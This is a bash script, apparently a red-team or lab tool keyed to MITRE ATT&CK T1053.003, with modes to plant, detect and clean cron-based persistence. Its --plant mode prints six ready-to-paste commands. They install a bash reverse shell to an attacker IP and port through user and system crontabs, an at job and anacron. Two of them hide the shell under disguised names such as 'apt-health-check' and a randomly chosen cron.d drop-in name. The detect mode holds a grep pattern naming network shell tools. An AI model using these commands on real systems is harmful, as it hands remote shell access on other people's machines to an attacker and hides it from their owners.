#!/bin/bash
# Cron-Based Persistence
# MITRE ATT&CK: T1053.003 — Scheduled Task/Job: Cron
# Usage: ./cron_persistence.sh --plant [--ip IP --port PORT]
#        ./cron_persistence.sh --detect
#        ./cron_persistence.sh --clean

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
ATTACKER_IP="${ATTACKER_IP:-10.10.14.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"

plant_cron() {
    local IP="${1:-$ATTACKER_IP}"
    local PORT="${2:-$ATTACKER_PORT}"

    echo -e "${GREEN}=== Cron Persistence Methods ===${NC}\n"

    # Method 1: User crontab
    echo -e "${YELLOW}[1] User Crontab${NC}"
    echo "  (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\"') | crontab -"
    echo ""

    # Method 2: System crontab (requires root)
    echo -e "${YELLOW}[2] System Crontab (/etc/crontab) — requires root${NC}"
    echo "  echo '*/5 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\"' >> /etc/crontab"
    echo ""

    # Method 3: /etc/cron.d/ with covert name
    echo -e "${YELLOW}[3] /etc/cron.d/ Drop-In — requires root${NC}"
    COVERT_NAMES=("logrotate-helper" "apt-compat-update" "sysstat-collect" "man-db-update" "mlocate-cron")
    CHOSEN="${COVERT_NAMES[$RANDOM % ${#COVERT_NAMES[@]}]}"
    echo "  cat > /etc/cron.d/$CHOSEN << 'EOF'"
    echo "  SHELL=/bin/bash"
    echo "  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    echo "  */10 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' >/dev/null 2>&1"
    echo "  EOF"
    echo "  chmod 644 /etc/cron.d/$CHOSEN"
    echo ""

    # Method 4: /etc/cron.{hourly,daily} script
    echo -e "${YELLOW}[4] Cron Periodic Script (/etc/cron.daily/) — requires root${NC}"
    echo "  cat > /etc/cron.daily/apt-health-check << 'EOF'"
    echo "  #!/bin/bash"
    echo "  /bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' &"
    echo "  EOF"
    echo "  chmod 755 /etc/cron.daily/apt-health-check"
    echo ""

    # Method 5: At job
    echo -e "${YELLOW}[5] At Job — one-time delayed execution${NC}"
    echo "  echo '/bin/bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\"' | at now + 5 minutes"
    echo ""

    # Method 6: Anacron
    echo -e "${YELLOW}[6] Anacron (/etc/anacrontab) — requires root${NC}"
    echo "  echo '1 5 system-health /bin/bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\"' >> /etc/anacrontab"
    echo ""
}

detect_cron() {
    echo -e "${GREEN}=== Cron Persistence Detection ===${NC}\n"

    echo -e "${YELLOW}[*] User crontabs:${NC}"
    for user in $(cut -d: -f1 /etc/passwd); do
        CRON=$(crontab -u "$user" -l 2>/dev/null)
        if [ -n "$CRON" ]; then
            echo -e "  ${YELLOW}$user:${NC}"
            echo "$CRON" | grep -v '^#' | grep -v '^$' | sed 's/^/    /'
        fi
    done

    echo -e "\n${YELLOW}[*] System crontab entries:${NC}"
    grep -v '^#' /etc/crontab 2>/dev/null | grep -v '^$' | sed 's/^/  /'

    echo -e "\n${YELLOW}[*] /etc/cron.d/ files:${NC}"
    for f in /etc/cron.d/*; do
        [ -f "$f" ] || continue
        echo -e "  ${YELLOW}$f ($(stat -c '%U:%G %a' "$f" 2>/dev/null)):${NC}"
        grep -v '^#' "$f" | grep -v '^$' | sed 's/^/    /'
    done

    echo -e "\n${YELLOW}[*] Suspicious cron scripts:${NC}"
    for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
        for f in "$d"/*; do
            [ -f "$f" ] || continue
            if grep -qlE '/dev/tcp|nc\s|ncat\s|socat|curl.*http|wget.*http|python.*socket|base64.*-d' "$f" 2>/dev/null; then
                echo -e "  ${RED}[!] Suspicious: $f${NC}"
                grep -nE '/dev/tcp|nc\s|ncat|socat|curl|wget|python.*socket|base64' "$f" | sed 's/^/      /'
            fi
        done
    done

    echo -e "\n${YELLOW}[*] At jobs:${NC}"
    atq 2>/dev/null || echo "  (none)"

    echo -e "\n${YELLOW}[*] Anacron:${NC}"
    grep -v '^#' /etc/anacrontab 2>/dev/null | grep -v '^$' | sed 's/^/  /'
}

clean_cron() {
    echo -e "${GREEN}=== Cron Persistence Cleanup ===${NC}\n"

    echo -e "${YELLOW}[*] Commands to clean up:${NC}"
    echo "  # Remove user crontab entries"
    echo "  crontab -e  # manually remove suspicious lines"
    echo ""
    echo "  # Remove /etc/cron.d/ drop-ins"
    echo "  rm /etc/cron.d/<suspicious_file>"
    echo ""
    echo "  # Remove cron periodic scripts"
    echo "  rm /etc/cron.{hourly,daily,weekly,monthly}/<suspicious_script>"
    echo ""
    echo "  # Clean /etc/crontab"
    echo "  vi /etc/crontab  # remove suspicious lines"
    echo ""
    echo "  # Remove at jobs"
    echo "  atrm <job_number>"
}

case "$1" in
    --plant)
        shift
        while [ $# -gt 0 ]; do
            case "$1" in
                --ip) ATTACKER_IP="$2"; shift 2;;
                --port) ATTACKER_PORT="$2"; shift 2;;
                *) shift;;
            esac
        done
        plant_cron "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    --detect) detect_cron ;;
    --clean)  clean_cron ;;
    *)
        echo "Usage: $0 --plant [--ip IP --port PORT]"
        echo "       $0 --detect"
        echo "       $0 --clean"
        ;;
esac
